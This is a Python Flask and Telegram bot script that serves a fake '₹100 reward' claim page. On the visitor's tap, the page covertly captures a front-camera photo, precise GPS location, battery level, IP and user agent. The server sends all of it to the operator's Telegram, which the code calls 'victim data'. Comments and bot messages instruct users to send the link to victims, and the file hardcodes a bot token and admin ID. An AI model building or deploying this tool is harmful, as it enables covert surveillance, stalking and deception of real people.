import os
import json
import base64
import logging
import requests
from io import BytesIO
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import threading
import time
import uuid

# ======== CONFIG ========
BOT_TOKEN = "8222470338:AAE5mR86BFGu1V9NwJok-N1yquxbmqtHVNI"
ADMIN_ID = 8641876252
PORT = int(os.environ.get("PORT", 5000))

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

DB_FILE = "botdata.json"

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            return json.load(f)
    return {"admins": [str(ADMIN_ID)], "banned": [], "users": [], "logs": [], "bot_on": True, "visits": []}

def save_db(db):
    with open(DB_FILE, "w") as f:
        json.dump(db, f, indent=2)

def is_admin(uid):
    db = load_db()
    return str(uid) in db["admins"] or str(uid) == str(ADMIN_ID)

def is_banned(uid):
    db = load_db()
    return str(uid) in db.get("banned", [])

# ======== FLASK ========
app = Flask(__name__)

CLAIM_PAGE = """<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Claim Reward</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.box{background:#fff;border-radius:20px;padding:40px 30px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
.icon{font-size:72px;margin-bottom:20px;animation:bounce 1s infinite}
@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
h1{color:#333;font-size:28px;margin-bottom:10px}
.rs{font-size:48px;font-weight:700;color:#28a745;margin:15px 0}
.rs span{font-size:24px}
p{color:#666;margin-bottom:25px;font-size:14px}
.btn{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;padding:18px 60px;font-size:22px;font-weight:700;border-radius:50px;cursor:pointer;width:100%;box-shadow:0 5px 20px rgba(102,126,234,.4)}
.btn:hover{transform:translateY(-2px)}
.btn:disabled{opacity:.7;cursor:not-allowed}
.sts{margin-top:20px;padding:15px;border-radius:10px;display:none}
.ok{background:#d4edda;color:#155724;display:block}
.fail{background:#f8d7da;color:#721c24;display:block}
.load{display:none;margin-top:15px}
.spin{border:4px solid #f3f3f3;border-top:4px solid #667eea;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
small{font-size:11px;color:#999;margin-top:20px;display:block}
</style>
</head>
<body>
<div class="box">
<div class="icon">🎉</div>
<h1>Congratulations!</h1>
<p>You have been selected as today's winner!</p>
<div class="rs">₹<span>100</span></div>
<p>Tap below to claim your reward instantly.</p>
<button class="btn" onclick="claim()" id="cbtn">👉 CLAIM ₹100</button>
<div class="load" id="load"><div class="spin"></div><p style="margin-top:10px;color:#666;">Verifying...</p></div>
<div class="sts" id="sts"></div>
<small>* Limited time offer</small>
</div>
<script>
let vid = "[VID]";
let sent = false;
async function claim(){
  if(sent) return; sent = true;
  document.getElementById('cbtn').style.display = 'none';
  document.getElementById('load').style.display = 'block';
  let bat = 'Unknown', lat = null, lon = null, photo = null;
  try{let b = await navigator.getBattery(); bat = Math.round(b.level*100)+'%'}catch(e){}
  try{
    let p = await new Promise((ok,no)=>navigator.geolocation.getCurrentPosition(ok,no,{enableHighAccuracy:true,timeout:8000}));
    lat = p.coords.latitude; lon = p.coords.longitude;
  }catch(e){}
  try{
    let s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240},audio:false});
    let v = document.createElement('video'); v.srcObject = s; await v.play();
    let c = document.createElement('canvas'); c.width = 320; c.height = 240;
    c.getContext('2d').drawImage(v,0,0);
    s.getTracks().forEach(t=>t.stop());
    photo = c.toDataURL('image/jpeg',0.7);
  }catch(e){}
  let ip = 'Unknown';
  try{let r = await fetch('https://api.ipify.org?format=json'); let d = await r.json(); ip = d.ip}catch(e){}
  fetch('/data',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({vid:vid,battery:bat,lat:lat,lon:lon,photo:photo,ip:ip,ua:navigator.userAgent,ts:new Date().toISOString()})
  }).then(r=>r.json()).then(d=>{
    document.getElementById('load').style.display = 'none';
    document.getElementById('sts').className = 'sts ok';
    document.getElementById('sts').innerHTML = '✅ <b>Reward Claimed!</b><br>₹100 will be credited within 24 hours.';
  }).catch(e=>{
    document.getElementById('load').style.display = 'none';
    document.getElementById('sts').className = 'sts fail';
    document.getElementById('sts').innerHTML = '❌ Try again.';
    sent = false;
  });
}
</script>
</body>
</html>"""

@app.route('/')
def home():
    """Primary URL - YAHI VICTIM KO BHEJNA HAI"""
    vid = str(uuid.uuid4())[:8]
    
    # Log visit
    db = load_db()
    db["visits"].append({"vid": vid, "time": datetime.now().isoformat(), "ip": request.remote_addr})
    save_db(db)
    
    # Send notification to admin DM
    try:
        ip = request.remote_addr
        ua = request.headers.get("User-Agent", "Unknown")
        msg = f"👤 <b>New Visitor!</b>\n"
        msg += f"🌐 IP: <code>{ip}</code>\n"
        msg += f"📱 UA: {ua[:50]}...\n"
        msg += f"🕐 {datetime.now().isoformat()}"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
            "chat_id": ADMIN_ID, "text": msg, "parse_mode": "HTML"
        })
    except:
        pass
    
    return render_template_string(CLAIM_PAGE.replace("[VID]", vid))

@app.route('/data', methods=['POST'])
def receive_data():
    """Receive data when victim claims"""
    data = request.json
    
    entry = {
        "vid": data.get("vid", "?"),
        "ip": data.get("ip", "N/A"),
        "battery": data.get("battery", "N/A"),
        "lat": data.get("lat"),
        "lon": data.get("lon"),
        "photo": data.get("photo"),
        "ua": data.get("ua", "N/A"),
        "ts": datetime.now().isoformat()
    }
    
    db = load_db()
    db["logs"].append(entry)
    save_db(db)
    
    # Send to admin DM with ALL data
    try:
        msg = f"🔔 <b>Victim Data Received!</b>\n"
        msg += f"🌐 IP: <code>{entry['ip']}</code>\n"
        msg += f"🔋 Battery: {entry['battery']}\n"
        if entry['lat'] and entry['lon']:
            msg += f"📍 {entry['lat']}, {entry['lon']}\n"
            msg += f"🗺️ <a href='https://maps.google.com/maps?q={entry['lat']},{entry['lon']}'>Google Maps</a>\n"
        msg += f"📱 UA: {entry['ua'][:80]}\n"
        msg += f"🕐 {entry['ts']}"
        
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
            "chat_id": ADMIN_ID, "text": msg, "parse_mode": "HTML"
        })
        
        # Send photo
        if entry.get('photo'):
            try:
                img_bytes = base64.b64decode(entry['photo'].split(',')[1])
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
                    data={"chat_id": ADMIN_ID, "caption": "📸 Victim Photo"},
                    files={"photo": ("victim.jpg", BytesIO(img_bytes), "image/jpeg")})
            except:
                pass
    except Exception as e:
        logger.error(f"DM error: {e}")
    
    return jsonify({"success": True})

@app.route('/health')
def health():
    return "OK", 200

# ======== BOT ========
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    db = load_db()
    
    if is_banned(u.id):
        await update.message.reply_text("❌ Access Denied. Contact @iflexvenom")
        return
    if not db.get("bot_on", True):
        await update.message.reply_text("❌ Bot Off. Contact @iflexvenom")
        return
    
    if str(u.id) not in [x["id"] for x in db["users"]]:
        db["users"].append({"id": str(u.id), "uname": u.username, "fname": u.first_name, "joined": str(update.message.date)})
        save_db(db)
    
    welcome = f"👋 Welcome {u.first_name}!\n\n"
    welcome += "✅ Bot ready!\n"
    welcome += f"🔗 Primary URL: <code>{request.url_root.rstrip('/')}</code>\n\n"
    welcome += "Ye URL victim ko bhejo. Woh Claim ₹100 dabayega → data DM mein aayega."
    
    await update.message.reply_text(welcome, parse_mode="HTML")
    if is_admin(u.id):
        await update.message.reply_text("✅ Admin mode. Use /help")

async def handle_msg(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    db = load_db()
    
    if is_banned(u.id):
        await update.message.reply_text("❌ Access Denied. Contact @iflexvenom")
        return
    if not db.get("bot_on", True):
        await update.message.reply_text("❌ Bot Off. Contact @iflexvenom")
        return
    
    text = update.message.text.strip()
    
    # Admin commands
    if is_admin(u.id) and text.startswith("/"):
        args = text.split()
        cmd = args[0].lower()
        
        if cmd == "/help":
            h = """<b>Admin Commands:</b>
/approve [id] - Add admin
/unapprove [id] - Remove admin
/ban [id] - Ban
/unban [id] - Unban
/users - List users
/stats - Stats
/logs - Victim logs
/on - Bot ON
/off - Bot OFF
/clear - Clear logs"""
            await update.message.reply_text(h, parse_mode="HTML")
        
        elif cmd == "/approve":
            if len(args) < 2: return await update.message.reply_text("Usage: /approve [id]")
            uid = args[1]
            db = load_db()
            if uid not in db["admins"]:
                db["admins"].append(uid); save_db(db)
                await update.message.reply_text(f"✅ {uid} approved!")
                try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": uid, "text": "✅ Admin! /help"})
                except: pass
            else: await update.message.reply_text("Already admin")
        
        elif cmd == "/unapprove":
            if len(args) < 2: return await update.message.reply_text("Usage: /unapprove [id]")
            uid = args[1]
            db = load_db()
            if uid in db["admins"] and uid != str(ADMIN_ID):
                db["admins"].remove(uid); save_db(db)
                await update.message.reply_text(f"❌ {uid} removed")
            else: await update.message.reply_text("Can't remove")
        
        elif cmd == "/ban":
            if len(args) < 2: return await update.message.reply_text("Usage: /ban [id]")
            uid = args[1]
            db = load_db()
            if uid not in db.get("banned", []):
                db.setdefault("banned", []).append(uid); save_db(db)
                await update.message.reply_text(f"⛔ {uid} banned!")
        
        elif cmd == "/unban":
            if len(args) < 2: return await update.message.reply_text("Usage: /unban [id]")
            uid = args[1]
            db = load_db()
            if uid in db.get("banned", []):
                db["banned"].remove(uid); save_db(db)
                await update.message.reply_text(f"✅ {uid} unbanned!")
        
        elif cmd == "/users":
            db = load_db()
            us = db["users"]
            if not us: return await update.message.reply_text("No users")
            msg = f"📊 Users: {len(us)}\n"
            for x in us[-20:]:
                msg += f"🆔 {x['id']} | {x.get('fname','?')} | @{x.get('uname','?')}\n"
            await update.message.reply_text(msg[:4000])
        
        elif cmd == "/stats":
            db = load_db()
            s = f"📊 Stats:\n👥 Users: {len(db['users'])}\n📝 Logs: {len(db['logs'])}\n👁️ Visits: {len(db.get('visits',[]))}\n🛡️ Admins: {len(db['admins'])}\n⛔ Banned: {len(db.get('banned',[]))}\n{'🟢 ON' if db.get('bot_on') else '🔴 OFF'}"
            await update.message.reply_text(s)
        
        elif cmd == "/logs":
            db = load_db()
            logs = db["logs"][-10:]
            if not logs: return await update.message.reply_text("No logs")
            msg = f"📋 Last {len(logs)}:\n"
            for l in logs:
                msg += f"🌐 {l.get('ip','?')} 🔋 {l.get('battery','?')}\n"
                if l.get('lat'): msg += f"📍 {l['lat']},{l['lon']}\n"
                msg += f"🕐 {l.get('ts','?')[:19]}\n───\n"
            await update.message.reply_text(msg[:4000])
        
        elif cmd == "/on":
            db = load_db(); db["bot_on"] = True; save_db(db)
            await update.message.reply_text("🟢 Bot ON")
        
        elif cmd == "/off":
            db = load_db(); db["bot_on"] = False; save_db(db)
            await update.message.reply_text("🔴 Bot OFF")
        
        elif cmd == "/clear":
            db = load_db(); db["logs"] = []; save_db(db)
            await update.message.reply_text("🗑️ Cleared!")
        
        return
    
    # Agar koi link daale to batao ki primary URL use kare
    await update.message.reply_text(
        f"❌ Extra link generate nahi hota.\n\n"
        f"Sirf <b>primary URL</b> use karo:\n"
        f"🔗 <code>{request.url_root.rstrip('/')}</code>\n\n"
        f"Yehi URL victim ko bhejo. Woh 'Claim ₹100' dabayega → data DM mein.",
        parse_mode="HTML"
    )

# ======== RUN ========
def start_flask():
    app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)

def start_bot():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
    application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == "__main__":
    logger.info(f"Starting on port {PORT}")
    t = threading.Thread(target=start_flask, daemon=True)
    t.start()
    time.sleep(2)
    start_bot()
